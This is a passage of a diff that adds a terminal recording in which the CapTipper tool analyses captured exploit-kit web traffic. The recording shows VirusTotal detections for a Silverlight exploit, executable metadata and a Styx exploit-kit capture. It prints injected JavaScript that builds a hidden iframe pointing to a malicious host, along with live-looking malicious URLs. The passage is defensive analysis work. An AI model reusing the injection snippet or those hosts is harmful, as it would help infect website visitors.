A3    :%)..*...2.H.\\(.\r\n00D0   AE CD ED 7C A9 8C 5C CD AE "
+    ],
+    [
+      0.000049,
+      "84 18 7D A8 36 36 17    ...|..\\....}.66.\r\n"
+    ],
+    [
+      0.000024,
+      "00E0   FE A1 03 FF 2D 9E A1 A8 CD A3 45 98 8A 3F C5 43    ....-.....E..?.C\r\n00F0   76 13 17 D5 85 E1 01 7D 69 E8 89 C8 18 AE BE 01    v......}i.......\r\n\r\n"
+    ],
+    [
+      0.000023,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.311307,
+      "z"
+    ],
+    [
+      0.119737,
+      "i"
+    ],
+    [
+      0.072306,
+      "p"
+    ],
+    [
+      0.279907,
+      "l"
+    ],
+    [
+      0.072065,
+      "i"
+    ],
+    [
+      0.015971,
+      "s"
+    ],
+    [
+      0.127767,
+      "t"
+    ],
+    [
+      0.272351,
+      " "
+    ],
+    [
+      0.159626,
+      "1"
+    ],
+    [
+      0.112299,
+      "3"
+    ],
+    [
+      1.335652,
+      "\r\n"
+    ],
+    [
+      0.000316,
+      " 2 Files found in zip object 13 (00015d76.swf):\r\n\r\n [Z] 1 : AppManifest.xaml\r\n"
+    ],
+    [
+      0.000007,
+      " [Z] 2 : xervamanepe4enki.dll\r\n\r\n"
+    ],
+    [
+      0.000056,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.895790,
+      "v"
+    ],
+    [
+      0.047795,
+      "t"
+    ],
+    [
+      0.240108,
+      " "
+    ],
+    [
+      0.256074,
+      "1"
+    ],
+    [
+      0.104109,
+      "3"
+    ],
+    [
+      0.991668,
+      "\r\n"
+    ],
+    [
+      0.000134,
+      " VirusTotal result for object 13 (00015d76.swf):\r\n\r\n"
+    ],
+    [
+      1.060989,
+      " Detection: 39/57\r\n Last Analysis Date: 2015-04-09 11:52:37\r\n Report Link: https://www.virustotal.com/file/5bcb20f506ce854eb3191ca87a14c5777cdcb0f96ffec0b68e3535001d3675db/analysis/1428580357/\r\n\r\n Scan Result:\r\n"
+    ],
+    [
+      0.000014,
+      "\tMicroWorld-eScan\tGen:Variant.Kazy.490518\t12.0.250.0\t20150409\r\n\tCAT-QuickHeal\tTrojan.Generic.r3\t14.00\t20150409\r\n\tALYac\tExploit.CVE-2013-0074\t1.0.1.4\t20150409\r\n\tMalwarebytes\tTrojan.Agent\t1.75.0.1\t20150409\r\n"
+    ],
+    [
+      0.000007,
+      "\tZillya\tExploit.CVE.Win32.243\t2.0.0.2132\t20150408\r\n"
+    ],
+    [
+      0.000020,
+      "\tBitDefender\tGen:Variant.Kazy.490518\t7.2\t20150409\r\n"
+    ],
+    [
+      0.000004,
+      "\tK7GW\tExploit ( 004b06661 )\t9.202.15535\t20150409\r\n"
+    ],
+    [
+      0.000005,
+      "\tK7AntiVirus\tExploit ( 004b06661 )\t9.202.15535\t20150409\r\n"
+    ],
+    [
+      0.000010,
+      "\tNANO-Antivirus\tExploit.Win32.CVE20130074.dikfyh\t0.30.10.952\t20150409\r\n"
+    ],
+    [
+      0.000011,
+      "\tF-Prot\tW32/CVE130074.I\t4.7.1.166\t20150409\r\n"
+    ],
+    [
+      0.000005,
+      "\tSymantec\tTrojan.Gen.2\t20141.2.0.56\t20150409\r\n"
+    ],
+    [
+      0.000059,
+      "\tNorman\tCVE-2013-0074.D\t7.04.04\t20150409\r\n"
+    ],
+    [
+      0.000010,
+      "\tTotalDefense\tWin32/Tnega.DPSQOR\t37.0.11540\t20150409\r\n\tTrendMicro-HouseCall\tTROJ_GE.63B84786\t9.700.0.1001\t20150409\r\n\tAvast\tWin32:Malware-gen\t8.0.1489.320\t20150409\r\n\tClamAV\tSILVERLIGHT.Exploit.Nuclear\t0.98.5.0\t20150409\r\n"
+    ],
+    [
+      0.000004,
+      "\tAgnitum\tExploit.CVE-2013-0074!\t5.5.1.3\t20150408\r\n"
+    ],
+    [
+      0.000016,
+      "\tAd-Aware\tGen:Variant.Kazy.490518\t12.0.163.0\t20150409\r\n"
+    ],
+    [
+      0.000004,
+      "\tEmsisoft\tGen:Variant.Kazy.490518 (B)\t3.0.0.600\t20150409\r\n"
+    ],
+    [
+      0.000016,
+      "\tComodo\tUnclassifiedMalware\t21701\t20150409\r\n\tF-Secure\tGen:Variant.Kazy.490518\t11.0.19100.45\t20150409\r\n"
+    ],
+    [
+      0.000027,
+      "\tDrWeb\tExploit.CVE2013-0074.36\t7.0.12.3050\t20150409\r\n"
+    ],
+    [
+      0.000004,
+      "\tVIPRE\tTrojan.Win32.Generic!BT\t39190\t20150409\r\n"
+    ],
+    [
+      0.000009,
+      "\tTrendMicro\tTROJ_GE.63B84786\t9.740.0.1012\t20150409\r\n"
+    ],
+    [
+      0.000024,
+      "\tMcAfee-GW-Edition\tRDN/Generic Exploit!1ns\tv2015\t20150409\r\n"
+    ],
+    [
+      0.000004,
+      "\tSophos\tMal/Generic-S\t4.98.0\t20150409\r\n"
+    ],
+    [
+      0.000243,
+      "\tCyren\tW32/CVE130074.MCZQ-2806\t5.4.16.7\t20150409\r\n"
+    ],
+    [
+      0.000013,
+      "\tAvira\tEXP/Silverlight.Gen2\t3.6.1.96\t20150409\r\n\tAntiy-AVL\tTrojan/Win32.SGeneric\t1.0.0.1\t20150409\r\n\tMicrosoft\tExploit:MSIL/CVE-2013-0074.F\t1.1.11502.0\t20150409\r\n\tGData\tGen:Variant.Kazy.490518\t25\t20150409\r\n\tMcAfee\tRDN/Generic Exploit!1ns\t6.0.5.614\t20150409\r\n\tAVware\tTrojan.Win32.Generic!BT\t1.5.0.21\t20150409\r\n\tBaidu-International\tTrojan.Win32.CVE-2013-0074.DA\t3.5.1.41473\t20150409\r\n\tESET-NOD32\ta variant of Win32/Exploit.CVE-2013-0074.DA\t11447\t20150409\r\n\tTencent\tWin32.Exploit.Silverlight.Lmuv\t1.0.0.1\t20150409\r\n\tIkarus\tExploit.CVE-2013-0074\tT3.1.8.9.0\t20150409\r\n\tAVG\tExploit_c.ABKR\t15.0.0.4328\t20150409\r\n\tPanda\tExploit/CVE-2013-0074\t4.6.4.2\t20150408\r\n\r\n"
+    ],
+    [
+      0.000045,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      2.250524,
+      "p"
+    ],
+    [
+      0.111755,
+      "e"
+    ],
+    [
+      0.208168,
+      "i"
+    ],
+    [
+      0.055921,
+      "n"
+    ],
+    [
+      0.128016,
+      "f"
+    ],
+    [
+      0.135900,
+      "o"
+    ],
+    [
+      0.392125,
+      " "
+    ],
+    [
+      0.159758,
+      "1"
+    ],
+    [
+      0.088260,
+      "4"
+    ],
+    [
+      1.511851,
+      "\r\n"
+    ],
+    [
+      0.000149,
+      "Displaying PE info of object 14 (8.exe) [139264 bytes]:\r\n"
+    ],
+    [
+      0.158800,
+      "\r\nMeta-data\r\n================================================================================\r\nSize:    139264 bytes\r\nMD5:     67291715c45c4594b8866e90fbf5c7c4\r\nSHA1:    a86dcb1d04be68a9f2d2373ee55cbe15fd299452\r\nDate:    0x545A5C51 [Wed Nov  5 17:20:17 2014 UTC]\r\nEP:      0x401314 .text 0/3\r\nCRC:     Claimed: 0x24dec, Actual: 0x2621d [SUSPICIOUS]\r\n\r\nResource entries\r\n================================================================================\r\nName               RVA      Size     Lang         Sublang                  Type\r\n--------------------------------------------------------------------------------\r\nRT_ICON            0x22980  0xea8    LANG_NEUTRAL SUBLANG_NEUTRAL          \r\nRT_ICON            0x218d8  0x10a8   LANG_NEUTRAL SUBLANG_NEUTRAL          \r\nRT_ICON            0x21470  0x468    LANG_NEUTRAL SUBLANG_NEUTRAL          \r\nRT_ICON            0x21108  0x368    LANG_NEUTRAL SUBLANG_NEUTRAL          \r\nRT_ICON            0x20460  0xca8    LANG_NEUTRAL SUBLANG_NEUTRAL          \r\nRT_GROUP_ICON      0x204"
+    ],
+    [
+      0.000044,
+      "14  0x4c     LANG_NEUTRAL SUBLANG_NEUTRAL          \r\nRT_VERSION         0x201b0  0x264    LANG_ENGLISH SUBLANG_ENGLISH_US       \r\n\r\nSections\r\n================================================================================\r\nName       VirtAddr     VirtSize     RawSize      Entropy     \r\n--------------------------------------------------------------------------------\r\n.text      0x1000       0x1b5d8      0x1c000      6.635876    \r\n.data      0x1d000      0x2128       0x1000       0.000000    \r\n.rsrc      0x20000      0x3828       0x4000       4.580442    \r\n\r\nVersion info\r\n================================================================================\r\nTranslation: 0x0409 0x04b0\r\nInternalName: ProV\r\nFileVersion: 3.07\r\nCompanyName: VSO Software\r\nComments: All rights reserved\r\nProductName: Filmf\\xf6rderanstalten\r\nProductVersion: 3.07\r\nOriginalFilename: ProV.exe\r\n"
+    ],
+    [
+      0.000007,
+      "\r\n"
+    ],
+    [
+      0.000022,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      1.704667,
+      "e"
+    ],
+    [
+      0.200012,
+      "x"
+    ],
+    [
+      0.288427,
+      "i"
+    ],
+    [
+      0.087733,
+      "t"
+    ],
+    [
+      0.856133,
+      "\r\n"
+    ],
+    [
+      0.334151,
+      "WebServer Shutdown.\r\n\r\nLeaving CapTipper... Good Bye!\r\n"
+    ],
+    [
+      0.007466,
+      "\u001b[0m"
+    ],
+    [
+      0.002759,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                                        \r \r"
+    ],
+    [
+      0.000056,
+      "\u001b]2;omriher@Omris-MacBook-Pro: ~/Development/tmp_for_pres/CapTipper\u0007"
+    ],
+    [
+      0.000003,
+      "\u001b]1;..res/CapTipper\u0007"
+    ],
+    [
+      0.011757,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[01;32m➜ \u001b[01;32m \u001b[36mCapTipper \u001b[01;34m\u001b[01;34m \u001b[00m"
+    ],
+    [
+      0.000006,
+      "\u001b[K"
+    ],
+    [
+      0.000135,
+      "\u001b[?1h\u001b="
+    ],
+    [
+      0.988165,
+      "s"
+    ],
+    [
+      0.079682,
+      "\u0008su"
+    ],
+    [
+      0.111860,
+      "d"
+    ],
+    [
+      0.120141,
+      "o"
+    ],
+    [
+      0.127637,
+      " "
+    ],
+    [
+      0.112233,
+      "p"
+    ],
+    [
+      0.215906,
+      "y"
+    ],
+    [
+      0.111860,
+      "t"
+    ],
+    [
+      0.208346,
+      "hon"
+    ],
+    [
+      0.431805,
+      " "
+    ],
+    [
+      0.216038,
+      "C"
+    ],
+    [
+      0.199952,
+      "a"
+    ],
+    [
+      0.192210,
+      "pTipper.py\u001b[1m \u001b[0m"
+    ],
+    [
+      1.288168,
+      "\u0008\u001b[0m ~"
+    ],
+    [
+      0.183518,
+      "/"
+    ],
+    [
+      0.487810,
+      "R"
+    ],
+    [
+      0.192249,
+      "e"
+    ],
+    [
+      0.143956,
+      "s"
+    ],
+    [
+      0.174900,
+      "earch\u001b[1m/\u001b[0m"
+    ],
+    [
+      1.208950,
+      "\u0008\u001b[0m/2"
+    ],
+    [
+      0.080234,
+      "0"
+    ],
+    [
+      0.087870,
+      "1"
+    ],
+    [
+      0.135921,
+      "4"
+    ],
+    [
+      0.519979,
+      "-"
+    ],
+    [
+      0.631989,
+      "0"
+    ],
+    [
+      0.072242,
+      "9"
+    ],
+    [
+      0.551855,
+      "-"
+    ],
+    [
+      0.095877,
+      "2"
+    ],
+    [
+      0.159907,
+      "8"
+    ],
+    [
+      0.127578,
+      "-Styx-EK-traffic.pcap\u001b[1m \u001b[0m"
+    ],
+    [
+      1.695996,
+      "\u0008\u001b[0m -"
+    ],
+    [
+      0.248537,
+      "g"
+    ],
+    [
+      1.543632,
+      "\u001b[?1l\u001b\u003e"
+    ],
+    [
+      0.000102,
+      "\r\r\n"
+    ],
+    [
+      0.000664,
+      "\u001b]2;sudo python CapTipper.py ~/Research/2014-09-28-Styx-EK-traffic.pcap -g\u0007"
+    ],
+    [
+      0.000005,
+      "\u001b]1;python\u0007"
+    ],
+    [
+      0.081106,
+      "CapTipper v0.2 b10 - Malicious HTTP traffic explorer tool\r\nCopyright 2015 Omri Herscovici \u003comriher@gmail.com\u003e\r\n\r\n"
+    ],
+    [
+      0.000882,
+      "[A] Analyzing PCAP: /Users/omriher/Research/2014-09-28-Styx-EK-traffic.pcap\r\n"
+    ],
+    [
+      0.196378,
+      "\u001b[31m[-] Error parsing body of uri: /TbCAgWPudohEQ/gzgBQVI.html : CRC check failed 0x63b6e2e != 0xadb6f046L\u001b[0;0m\r\n"
+    ],
+    [
+      0.000074,
+      "\r\n[+] Traffic Activity Time:  Sun, 09/28/14 01:30:59\r\n"
+    ],
+    [
+      0.000005,
+      "[+] Conversations Found:\r\n\r\n"
+    ],
+    [
+      0.000039,
+      "0: \u001b[35m / \u001b[0;0m -\u003e text/html \u001b[0;0m(0.html)\u001b[0;0m [10.0 KB]  (Magic: \u001b[1mHTML\u001b[22m)\r\n1: \u001b[35m /wp-content/plugins/complete-gallery-manager/css/prettyPhoto.css \u001b[0;0m -\u003e text/css \u001b[0;0m(prettyPhoto.css)\u001b[0;0m [2.7 KB]  (Magic: \u001b[1mTEXT\u001b[22m)\r\n"
+    ],
+    [
+      0.000004,
+      "2: \u001b[35m /wp-content/themes/wp-clear321/styles/default.css \u001b[0;0m -\u003e text/css \u001b[0;0m(default.css)\u001b[0;0m [39.0 B]  (Magic: \u001b[1mTEXT\u001b[22m)\r\n"
+    ],
+    [
+      0.000025,
+      "3: \u001b[35m /wp-content/themes/wp-clear321/style.css \u001b[0;0m -\u003e text/css \u001b[0;0m(style.css)\u001b[0;0m [9.9 KB]  (Magic: \u001b[1mTEXT\u001b[22m)\r\n"
+    ],
+    [
+      0.000006,
+      "4: \u001b[35m /wp-content/uploads/Mississippi-wedding-photographer-Bride-in-field-sully-clemmer-150x150.jpg \u001b[0;0m -\u003e image/jpeg \u001b[32m(Mississippi-wedding-photographer-Bride-in-field-sully-clemmer-150x150.jpg)\u001b[0;0m [20.5 KB]  (Magic: \u001b[1mJPG\u001b[22m)\r\n5: \u001b[35m /wp-content/uploads/Vera-Wang-Fall-2014-Fall-pink-coral-circle-large-flower-150x150.png \u001b[0;0m -\u003e image/png \u001b[32m(Vera-Wang-Fall-2014-Fall-pink-coral-circle-large-flower-150x150.png)\u001b[0;0m [43.6 KB]  (Magic: \u001b[1mPNG\u001b[22m)\r\n"
+    ],
+    [
+      0.000013,
+      "6: \u001b[35m /wp-content/themes/wp-clear321/images/feed.png \u001b[0;0m -\u003e image/png \u001b[32m(feed.png)\u001b[0;0m [1.4 KB]  (Magic: \u001b[1mPNG\u001b[22m)\r\n7: \u001b[35m /wp-includes/js/jquery/ui/jquery.ui.effect.min.js?ver=1.9.2 \u001b[0;0m -\u003e application/javascript \u001b[34m(jquery.ui.effect.min.js)\u001b[0;0m [5.0 KB]  (Magic: \u001b[1mTEXT\u001b[22m)\r\n"
+    ],
+    [
+      0.000007,
+      "8: \u001b[35m /wlkzkir.cgi?default \u001b[0;0m -\u003e text/html \u001b[0;0m(wlkzkir.cgi)\u001b[0;0m [301.0 B]  (Magic: \u001b[1mHTML\u001b[22m)\r\n"
+    ],
+    [
+      0.000014,
+      "9: \u001b[35m /TbCAgWPudohEQ \u001b[0;0m -\u003e text/html \u001b[0;0m(TbCAgWPudohEQ)\u001b[0;0m [0.0 B] \r\n"
+    ],
+    [
+      0.000072,
+      "10: \u001b[35m /TbCAgWPudohEQ/e.html \u001b[0;0m -\u003e text/html \u001b[0;0m(e.html)\u001b[0;0m [11.8 KB]  (Magic: \u001b[1mHTML\u001b[22m)\r\n"
+    ],
+    [
+      0.000005,
+      "11: \u001b[35m /TbCAgWPudohEQ/qtNDDUG.html \u001b[0;0m -\u003e text/html \u001b[0;0m(qtNDDUG.html)\u001b[0;0m [169.0 B]  (Magic: \u001b[1mHTML\u001b[22m)\r\n12: \u001b[35m /TbCAgWPudohEQ/ERAnnQG.html \u001b[0;0m -\u003e text/html \u001b[0;0m(ERAnnQG.html)\u001b[0;0m [4.8 KB]  (Magic: \u001b[1mHTML\u001b[22m)\r\n13: \u001b[35m /TbCAgWPudohEQ/gzgBQVI.html \u001b[0;0m -\u003e text/html \u001b[0;0m(gzgBQVI.html)\u001b[0;0m [14.1 KB]  (Magic: \u001b[1mHTML\u001b[22m)\r\n14: \u001b[35m /TbCAgWPudohEQ/djIhQ.swf \u001b[0;0m -\u003e application/x-shockwave-flash \u001b[33m(djIhQ.swf)\u001b[0;0m [5.1 KB]  (Magic: \u001b[1mSWF\u001b[22m)\r\n15: \u001b[35m /TbCAgWPudohEQ/loader2.exe\u0026h=33 \u001b[0;0m -\u003e application/x-msdownload \u001b[33m(loader2.exe)\u001b[0;0m [170.6 KB]  (Magic: \u001b[1mEXE\u001b[22m)\r\n\r\n"
+    ],
+    [
+      0.001026,
+      "\r\n\u001b[32m[+]\u001b[0;0m Started Web Server on http://localhost:80\r\n\u001b[32m[+]\u001b[0;0m Listening to requests...\r\n\r\n"
+    ],
+    [
+      0.109030,
+      "Starting CapTipper Interpreter\r\nType 'open \u003cconversation id\u003e' to open address in browser\r\nType 'hosts' to view traffic flow\r\nType 'help' for more options\r\n\r\n"
+    ],
+    [
+      0.000009,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      3.330879,
+      "h"
+    ],
+    [
+      0.055684,
+      "o"
+    ],
+    [
+      0.159498,
+      "s"
+    ],
+    [
+      0.104308,
+      "t"
+    ],
+    [
+      0.128092,
+      "s"
+    ],
+    [
+      0.464128,
+      "\r\n"
+    ],
+    [
+      0.000101,
+      "Found Hosts:\r\n\r\n"
+    ],
+    [
+      0.000013,
+      " bridepopmississippi.com (50.63.220.1:80)\r\n"
+    ],
+    [
+      0.000107,
+      " ├-- /   [0]\r\n ├-- /wp-content/plugins/complete-gallery-manager/css/prettyPhoto.css   [1]\r\n"
+    ],
+    [
+      0.000008,
+      " ├-- /wp-content/themes/wp-clear321/styles/default.css   [2]\r\n"
+    ],
+    [
+      0.000013,
+      " ├-- /wp-content/themes/wp-clear321/style.css   [3]\r\n"
+    ],
+    [
+      0.000009,
+      " ├-- /wp-content/uploads/Mississippi-wedding-photographer-Bride-in-field-sully-clemmer-150x150.jpg   [4]\r\n"
+    ],
+    [
+      0.000008,
+      " ├-- /wp-content/uploads/Vera-Wang-Fall-2014-Fall-pink-coral-circle-large-flower-150x150.png   [5]\r\n"
+    ],
+    [
+      0.000007,
+      " ├-- /wp-content/themes/wp-clear321/images/feed.png   [6]\r\n"
+    ],
+    [
+      0.000013,
+      " └-- /wp-includes/js/jquery/ui/jquery.ui.effect.min.js?ver=1.9.2   [8]\r\n\r\n\r\n"
+    ],
+    [
+      0.000004,
+      " rabiorik.ru (188.120.251.39:80)\r\n"
+    ],
+    [
+      0.000007,
+      " └-- /wlkzkir.cgi?default   [7]\r\n\r\n\r\n"
+    ],
+    [
+      0.000004,
+      " poolie.vvk49.com (162.244.33.39:80)\r\n"
+    ],
+    [
+      0.000042,
+      " ├-- /TbCAgWPudohEQ   [9]\r\n"
+    ],
+    [
+      0.000004,
+      " ├-- /TbCAgWPudohEQ/e.html   [10]\r\n ├-- /TbCAgWPudohEQ/qtNDDUG.html   [11]\r\n"
+    ],
+    [
+      0.000014,
+      " ├-- /TbCAgWPudohEQ/ERAnnQG.html   [12]\r\n"
+    ],
+    [
+      0.000022,
+      " ├-- /TbCAgWPudohEQ/gzgBQVI.html   [13]\r\n"
+    ],
+    [
+      0.000009,
+      " ├-- /TbCAgWPudohEQ/djIhQ.swf   [14]\r\n └-- /TbCAgWPudohEQ/loader2.exe\u0026h=33   [15]\r\n\r\n\r\n"
+    ],
+    [
+      0.000037,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      3.535267,
+      "f"
+    ],
+    [
+      0.064067,
+      "i"
+    ],
+    [
+      0.064051,
+      "n"
+    ],
+    [
+      0.071936,
+      "d"
+    ],
+    [
+      0.128138,
+      " "
+    ],
+    [
+      0.111937,
+      "a"
+    ],
+    [
+      0.079837,
+      "l"
+    ],
+    [
+      0.120137,
+      "l"
+    ],
+    [
+      0.240031,
+      " "
+    ],
+    [
+      0.883070,
+      "r"
+    ],
+    [
+      0.204749,
+      "a"
+    ],
+    [
+      0.303936,
+      "b"
+    ],
+    [
+      0.391913,
+      "i"
+    ],
+    [
+      0.080291,
+      "o"
+    ],
+    [
+      0.199950,
+      "r"
+    ],
+    [
+      0.120031,
+      "i"
+    ],
+    [
+      0.144010,
+      "k"
+    ],
+    [
+      1.231816,
+      "\r\n"
+    ],
+    [
+      0.000089,
+      "Searching 'rabiorik' in all objects:\r\n"
+    ],
+    [
+      0.001829,
+      "\r\n 0.html [0]:\r\n    (777,50587) : t(){create_frame(\"http://\u001b[1mrabiorik\u001b[22m.ru/wlkzkir.cgi?default\")\u001b[0;0m\r\n"
+    ],
+    [
+      0.003449,
+      "\r\n wlkzkir.cgi [8]:\r\n    (8,256) : 22 (@RELEASE@) Server at \u001b[1mrabiorik\u001b[22m.ru Port 80\u003c/address\u003e\u003c/b\u001b[0;0m\r\n"
+    ],
+    [
+      0.005154,
+      "\r\n"
+    ],
+    [
+      0.000009,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      2.005564,
+      "f"
+    ],
+    [
+      0.079747,
+      "i"
+    ],
+    [
+      0.055066,
+      "n"
+    ],
+    [
+      0.065163,
+      "d"
+    ],
+    [
+      0.103953,
+      " "
+    ],
+    [
+      0.135902,
+      "0"
+    ],
+    [
+      0.392104,
+      " "
+    ],
+    [
+      0.207962,
+      "c"
+    ],
+    [
+      0.239856,
+      "r"
+    ],
+    [
+      0.183598,
+      "e"
+    ],
+    [
+      0.232354,
+      "a"
+    ],
+    [
+      0.224144,
+      "t"
+    ],
+    [
+      0.064053,
+      "e"
+    ],
+    [
+      0.383957,
+      "_"
+    ],
+    [
+      0.232064,
+      "f"
+    ],
+    [
+      0.375592,
+      "r"
+    ],
+    [
+      0.168005,
+      "a"
+    ],
+    [
+      0.120194,
+      "m"
+    ],
+    [
+      0.104107,
+      "e"
+    ],
+    [
+      0.991614,
+      "\r\n"
+    ],
+    [
+      0.000123,
+      "Searching 'create_frame' in object 0 (0.html):\r\n\r\n"
+    ],
+    [
+      0.001215,
+      " (777,50213) : xt/javascript'\u003efunction \u001b[1mcreate_frame\u001b[22m(a){var b=document.getEle\u001b[0;0m\r\n (777,50566) : true}}function bdsls4t(){\u001b[1mcreate_frame\u001b[22m(\"http://rabiorik.ru/wlkz\u001b[0;0m\r\n\r\n"
+    ],
+    [
+      0.000028,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      2.414368,
+      "s"
+    ],
+    [
+      0.080485,
+      "l"
+    ],
+    [
+      0.064070,
+      "i"
+    ],
+    [
+      0.048997,
+      "c"
+    ],
+    [
+      0.134935,
+      "e"
+    ],
+    [
+      0.215852,
+      " "
+    ],
+    [
+      0.912042,
+      "0"
+    ],
+    [
+      0.112021,
+      " "
+    ],
+    [
+      0.560063,
+      "5"
+    ],
+    [
+      0.104022,
+      "0"
+    ],
+    [
+      0.192034,
+      "2"
+    ],
+    [
+      0.120007,
+      "1"
+    ],
+    [
+      0.135912,
+      "3"
+    ],
+    [
+      0.816056,
+      " "
+    ],
+    [
+      0.943768,
+      "2"
+    ],
+    [
+      0.112125,
+      "5"
+    ],
+    [
+      0.207978,
+      "6"
+    ],
+    [
+      1.472052,
+      "\r\n"
+    ],
+    [
+      0.000141,
+      "Displaying 256 of bytes from offset 50213 in object 0 (0.html):\r\n"
+    ],
+    [
+      0.000007,
+      "\r\ncreate_frame(a){var b=document.getElementById('weqe');if(typeof(b)!='undefined'\u0026\u0026b!=null){}else{var c=document.createElement('iframe');c.id=\"weqe\";c.style.width=\"0px\";c.style.height=\"0px\";c.style.border=\"0px\";c.frameBorder=\"0\";c.style.display=\"none\";c.setA\r\n\r\n"
+    ],
+    [
+      0.000058,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      2.215673,
+      "j"
+    ],
+    [
+      0.087988,
+      "s"
+    ],
+    [
+      0.271980,
+      "b"
+    ],
+    [
+      0.104010,
+      "e"
+    ],
+    [
+      0.144083,
+      "a"
+    ],
+    [
+      0.303883,
+      "u"
+    ],
+    [
+      0.136077,
+      "t"
+    ],
+    [
+      0.127746,
+      "i"
+    ],
+    [
+      0.079896,
+      "f"
+    ],
+    [
+      0.152168,
+      "y"
+    ],
+    [
+      0.135944,
+      " "
+    ],
+    [
+      1.127839,
+      "s"
+    ],
+    [
+      0.088225,
+      "l"
+    ],
+    [
+      0.071796,
+      "i"
+    ],
+    [
+      0.088183,
+      "c"
+    ],
+    [
+      0.103893,
+      "e"
+    ],
+    [
+      0.096294,
+      " "
+    ],
+    [
+      0.191929,
+      "0"
+    ],
+    [
+      0.759354,
+      " "
+    ],
+    [
+      0.664531,
+      "5"
+    ],
+    [
+      0.144044,
+      "0"
+    ],
+    [
+      0.343839,
+      "2"
+    ],
+    [
+      0.160142,
+      "1"
+    ],
+    [
+      0.119892,
+      "3"
+    ],
+    [
+      0.568000,
+      " "
+    ],
+    [
+      0.767695,
+      "5"
+    ],
+    [
+      0.096244,
+      "1"
+    ],
+    [
+      0.095867,
+      "2"
+    ],
+    [
+      1.688182,
+      "\r\n"
+    ],
+    [
+      0.007409,
+      "create_frame(a) {\r\n    var b = document.getElementById('weqe');\r\n    if (typeof(b) != 'undefined' \u0026\u0026 b != null) {} else {\r\n        var c = document.createElement('iframe');\r\n        c.id = \"weqe\";\r\n        c.style.width = \"0px\";\r\n        c.style.height = \"0px\";\r\n        c.style.border = \"0px\";\r\n        c.frameBorder = \"0\";\r\n        c.style.display = \"none\";\r\n        c.setAttribute(\"frameBorder\", \"0\");\r\n        document.body.appendChild(c);\r\n        c.src = a;\r\n        return true\r\n    }\r\n}\r\nfunction bdsls4t() {\r\n    create_frame(\"http://rabiorik.ru/wlkzkir.cgi?default\")\r\n}\r\ntry {\r\n    if (window.attachEvent) {\r\n        window.attachEvent('onload', bdsls4t)\r\n    } else {\r\n"
+    ],
+    [
+      0.000006,
+      "        if (window.onload) {\r\n            var curronload = wi\r\n"
+    ],
+    [
+      0.000029,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      2.856413,
+      "j"
+    ],
+    [
+      0.103984,
+      "s"
+    ],
+    [
+      0.167970,
+      "b"
+    ],
+    [
+      0.095975,
+      "e"
+    ],
+    [
+      0.168119,
+      "a"
+    ],
+    [
+      0.223921,
+      "u"
+    ],
+    [
+      0.128013,
+      "t"
+    ],
+    [
+      0.199928,
+      "i"
+    ],
+    [
+      0.495770,
+      "f"
+    ],
+    [
+      0.104241,
+      "y"
+    ],
+    [
+      0.287882,
+      " "
+    ],
+    [
+      0.808104,
+      "o"
+    ],
+    [
+      0.279924,
+      "b"
+    ],
+    [
+      0.056079,
+      "j"
+    ],
+    [
+      0.079932,
+      " "
+    ],
+    [
+      0.448059,
+      "8"
+    ],
+    [
+      1.311817,
+      "\r\n"
+    ],
+    [
+      0.001976,
+      " JavaScript Beautify of object 8 (wlkzkir.cgi) successful!\r\n New object created: 16\r\n\r\n"
+    ],
+    [
+      0.000033,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      2.821977,
+      "o"
+    ],
+    [
+      0.223723,
+      "b"
+    ],
+    [
+      0.072365,
+      "j"
+    ],
+    [
+      0.079767,
+      "e"
+    ],
+    [
+      0.136196,
+      "c"
+    ],
+    [
+      0.127674,
+      "t"
+    ],
+    [
+      0.096330,
+      "s"
+    ],
+    [
+      0.159928,
+      " "
+    ],
+    [
+      1.047865,
+      "\r\n"
+    ],
+    [
+      0.000080,
+      "Displaying Objects:\r\n\r\n"
+    ],
+    [
+      0.000009,
+      " ID   CID     TYPE          NAME\r\n---- -----  -----------   --------\r\n"
+    ],
+    [
+      0.000005,
+      "  0 | 0   | body        | 0.html\r\n"
+    ],
+    [
+      0.000012,
+      "  1 | 1   | body        | prettyPhoto.css\r\n"
+    ],
+    [
+      0.000004,
+      "  2 | 2   | body        | default.css\r\n"
+    ],
+    [
+      0.000003,
+      "  3 | 3   | body        | style.css\r\n"
+    ],
+    [
+      0.000011,
+      "  4 | 4   | body        | Mississippi-wedding-photographer-Bride-in-field-sully-clemmer-150x150.jpg\r\n"
+    ],
+    [
+      0.000004,
+      "  5 | 5   | body        | Vera-Wang-Fall-2014-Fall-pink-coral-circle-large-flower-150x150.png\r\n"
+    ],
+    [
+      0.000003,
+      "  6 | 6   | body        | feed.png\r\n"
+    ],
+    [
+      0.000010,
+      "  7 | 7   | body        | jquery.ui.effect.min.js\r\n"
+    ],
+    [
+      0.000004,
+      "  8 | 8   | body        | wlkzkir.cgi\r\n"
+    ],
+    [
+      0.000003,
+      "  9 | 9   | body        | TbCAgWPudohEQ\r\n"
+    ],
+    [
+      0.000014,
+      " 10 | 10  | body        | e.html\r\n 11 | 11  | body        | qtNDDUG.html\r\n"
+    ],
+    [
+      0.000004,
+      " 12 | 12  | body        | ERAnnQG.html\r\n"
+    ],
+    [
+      0.000008,
+      " 13 | 13  | body        | gzgBQVI.html\r\n"
+    ],
+    [
+      0.000004,
+      " 14 | 14  | body        | djIhQ.swf\r\n"
+    ],
+    [
+      0.000043,
+      " 15 | 15  | body        | loader2.exe\r\n 16 | 8   | jsbeautify  | jsbeautify-wlkzkir.cgi\r\n\r\n"
+    ],
+    [
+      0.000037,
+      "\u001b[36mCT\u003e \u001b[0;0m"
+    ],
+    [
+      4.104013,
+      "\r\nExiting CapTipper\r\n"
+    ],
+    [
+      0.271257,
+      "WebServer Shutdown.\r\n"
+    ],
+    [
+      0.007517,
+      "\u001b[0m"
+    ],
